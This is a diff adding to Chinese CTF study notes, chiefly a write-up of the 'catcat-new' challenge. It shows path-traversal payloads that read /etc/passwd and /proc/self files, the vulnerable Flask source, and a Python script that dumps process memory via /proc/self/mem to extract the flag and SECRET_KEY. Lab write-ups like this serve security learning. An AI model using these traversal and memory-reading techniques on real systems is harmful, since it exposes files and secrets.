@@ -121,6 +121,8 @@ if ( !empty($_REQUEST['file'])
 
 ![image-20230509230821517](CTF.assets/image-20230509230821517.png)
 
+**../即回退到上级目录，在url中使用../的时候 ../最前面随便写什么都行，只返回../最后面的文件数据。**
+
 最后得到`payload`
 
 `file=hint.php?../../../../../../../ffffllllaaaagggg`
@@ -2518,7 +2520,315 @@ $d = decode($c);
 var_dump(strrev($d));		# 输出：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}
 ```
 
+## 攻防世界 catcat-new
 
+> 这题主要考察的是文件包含漏洞和内存读取，有看不懂的就去看葵花宝典“Linux 虚拟文件系统”
+
+### 1. 任意文件读取
+
+进去随便点一下可以看到有一个`$_GET`变量`file`，输入错误文件名可以看到它的报错信息和包含路径
+
+<img src="CTF.assets/image-20231118162602292.png" alt="image-20231118162602292" style="zoom:67%;" />
+
+使用相对路径做包含访问`/etc/passwd`文件成功
+
+<img src="CTF.assets/image-20231118162641355.png" alt="image-20231118162641355" style="zoom: 50%;" />
+
+然后就没有头绪了，在这里卡了好久！
+
+尝试包含`/proc`文件，把能看的都看一下，最后得到如下信息：
+
+```
+file=../../../../../proc/self/cmdline：	
+python app.py			
+
+file=../../../../../proc/self/environ：	得到下面信息
+HOSTNAME=b90b9e98836f 
+PYTHON_PIP_VERSION=21.2.4 
+SHLVL=1 
+HOME=/root 
+OLDPWD=/ GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D 
+PYTHON_GET_PIP_URL=https://github.com/pypa/getpip/raw/3cb8888cc2869620f57d5d2da64da38f516078c7/public/get-pip.py 
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin 
+LANG=C.UTF-8 
+PYTHON_VERSION=3.7.12 
+PYTHON_SETUPTOOLS_VERSION=57.5.0 
+PWD=/app 
+PYTHON_GET_PIP_SHA256=c518250e91a70d7b20cceb15272209a4ded2a0c263ae5776f129e0d9b5674309
+```
+
+**信息汇总：**
+
+1. 当前文件名：`app.py`
+2. 当前工作路径：`/app`
+
+知道了路径和文件名，就可以直接包含出源文件了
+
+<img src="CTF.assets/image-20231118163417266.png" alt="image-20231118163417266" style="zoom:50%;" />
+
+由于这里使用的时二进制传输，在python中使用一下方式做格式转换
+
+```python
+src = b'import os \nimport uuid...'
+print(sec.decode())
+```
+
+就可以得到源码
+
+### 2. 代码审计
+
+通过上面的方式分别拿到`app.py`和`cat.py`
+
+**app.py**
+
++ python脚本先读取了flag，然后再删除了flag；所以flag保存在了**内存**里面
++ 在`/info`位置可以做文件包含包含内存文件来读取：`flag`和`SECRET_KEY`
++ 在拿到了`SECRET_KEY`之后可以做 Session 伪造，让系统返回Flag
+
+```py
+import os
+import uuid
+from flask import Flask, request, session, render_template, Markup
+from cat import cat
+
+flag = ""
+app = Flask(
+    __name__,
+    static_url_path='/',
+    static_folder='static'
+)
+# 设置 SECRET_KEY
+app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
+# 读取 /flag 文件到内存，然后删除该文件
+if os.path.isfile("/flag"):
+    flag = cat("/flag")
+    os.remove("/flag")
+
+
+@app.route('/', methods=['GET'])
+def index():
+    detailtxt = os.listdir('./details/')
+    cats_list = []
+    for i in detailtxt:
+        cats_list.append(i[:i.index('.')])
+
+    return render_template("index.html", cats_list=cats_list, cat=cat)
+
+# 文件包含代码位置：该位置接受两个参数：start，end；默认都为0
+@app.route('/info', methods=["GET", 'POST'])
+def info():
+    filename = "./details/" + request.args.get('file', "")
+    start = request.args.get('start', "0")
+    end = request.args.get('end', "0")
+    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]
+
+    return render_template("detail.html", catname=name, info=cat(filename, start, end))
+
+
+# 如果身份是admin，则返回Flag
+@app.route('/admin', methods=["GET"])
+def admin_can_list_root():
+    if session.get('admin') == 1:
+        return flag
+    else:
+        session['admin'] = 0
+    return "NoNoNo"
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=False, port=5637)
+
+```
+
+**cat.py**
+
+这是一个文件读取的脚本，可以给定起始位：`start`，结束位：`end`来决定文件读取的长度
+
+```py
+import os, sys, getopt
+
+
+def cat(filename, start=0, end=0) -> bytes:
+    data = b''
+
+    try:
+        start = int(start)
+        end = int(end)
+    except:
+        start = 0
+        end = 0
+
+    if filename != "" and os.access(filename, os.R_OK):
+        f = open(filename, "rb")
+
+        if start >= 0:
+            f.seek(start)
+            if end >= start and end != 0:
+                data = f.read(end - start)
+
+            else:
+                data = f.read()
+
+        else:
+            data = f.read()
+            f.close()
+
+    else:
+        data = ("File `%s` not exist or can not be read" % filename).encode()
+
+    return data
+
+
+if __name__ == '__main__':
+    opts, args = getopt.getopt(sys.argv[1:], '-h-f:-s:-e:', ['help', 'file=', 'start=', 'end='])
+    fileName = "../end.txt"
+    start = 0
+    end = 0
+
+    for opt_name, opt_value in opts:
+        if opt_name == '-h' or opt_name == '--help':
+            print("[*] Help")
+            print("-f --file File name")
+            print("-s --start Start position")
+            print("-e --end End position")
+            print("[*] Example of reading /etc/passwd")
+            print("python3 cat.py -f /etc/passwd")
+            print("python3 cat.py --file /etc/passwd")
+            print("python3 cat.py -f /etc/passwd -s 1")
+            print("python3 cat.py -f /etc/passwd -e 5")
+            print("python3 cat.py -f /etc/passwd -s 1 -e 5")
+            exit()
+
+        elif opt_name == '-f' or opt_name == '--file':
+            fileName = opt_value
+
+        elif opt_name == '-s' or opt_name == '--start':
+            start = opt_value
+
+        elif opt_name == '-e' or opt_name == '--end':
+            end = opt_value
+
+    if fileName != "":
+        print(cat(fileName, start, end))
+
+    else:
+        print("No file to read")
+```
+
+**cat.py 本地尝试**
+
+```py
+import os, sys, getopt
+
+
+def cat(filename, start=0, end=0) -> bytes:
+    data = b''
+
+    try:
+        start = int(start)
+        end = int(end)
+    except:
+        start = 0
+        end = 0
+
+    if filename != "" and os.access(filename, os.R_OK):
+        f = open(filename, "rb")
+		# 如果给定起始位，那么将文件光标定位到起始位
+        if start >= 0:
+            f.seek(start)
+            if end >= start and end != 0:
+                # 从起始位开始读取长度：长度=结束位-起始位
+                data = f.read(end - start)
+
+            else:
+                data = f.read()
+
+        else:
+            data = f.read()
+            f.close()
+
+    else:
+        data = ("File `%s` not exist or can not be read" % filename).encode()
+
+    return data
+
+
+if __name__ == '__main__':
+    opts, args = getopt.getopt(sys.argv[1:], '-h-f:-s:-e:', ['help', 'file=', 'start=', 'end='])
+    # 给定文件名
+    fileName = "../end.txt"
+    # 给定起始位
+    start = 0
+    # 给定结束位
+    end = 50
+
+    if fileName != "":
+        print(cat(fileName, start, end))
+
+    else:
+        print("No file to read")
+
+```
+
+### 3. 解题复现
+
+**抓取内存信息脚本**
+
+在这一步做到了抓取SECRET_KEY，但是无法复现Session伪造！（不知道什么原因）
+
+直接抓Flag的话也抓的到：`catctf{Catch_the_c4t_HaHa}`
+
+最好将关键信息保存到txt文件再做分析，控制台总感觉好像显示bu'quan
+
+```py
+import requests
+from lxml import etree
+import re
+
+
+# 1. 先读取maps文件
+req = requests.get('http://61.147.171.105:60619/info?file=../../../../../proc/self/maps').content
+
+# 2. 将maps文件写入本地：maps.txt
+html = etree.HTML(req.decode())
+list1 = html.xpath('//div[@class="feature-block"]/p/text()')
+# print(list1[0])
+
+# 3. 将得到的结果做格式处理并写入 maps.txt
+maps_data = re.search("b'(.*?)'", list1[0])
+maps_data = maps_data.group(1)
+maps_data = maps_data.replace("\\n", "\n")
+
+with open('maps.txt', 'w') as f:
+    f.write(maps_data)
+
+count = 1
+# 抓取有权限访问的内存地址：rw-p,并访问
+with open('maps.txt', 'r') as maps:
+    for line in maps:
+        if 'rw-p' in line:
+            start = re.search('([0-9a-z]{12})-', line)
+            end = re.search('-([0-9a-z]{12})', line)
+
+            # 格式处理
+            start = int(str(start.group(1)), 16)
+            end = int(str(end.group(1)), 16)
+
+            # 拿到了起始位和结束位，发送请求！
+            url = f"http://61.147.171.105:60619/info?file=../../../../../proc/self/mem&start={start}&end={end}"
+            mem_data = requests.get(url).content
+            print(f"正在发送{count}次请求")
+            count += 1
+
+            # 匹配 SECRET_KEY
+            # if re.search(b'[a-z0-9]{32}\*abcdefgh', mem_data):
+            #     print(mem_data)
+
+            if re.search(b'catctf', mem_data):
+                print(mem_data)
+                with open('end.txt', 'wb') as f:
+                    f.write(mem_data)
+```
 
 
 
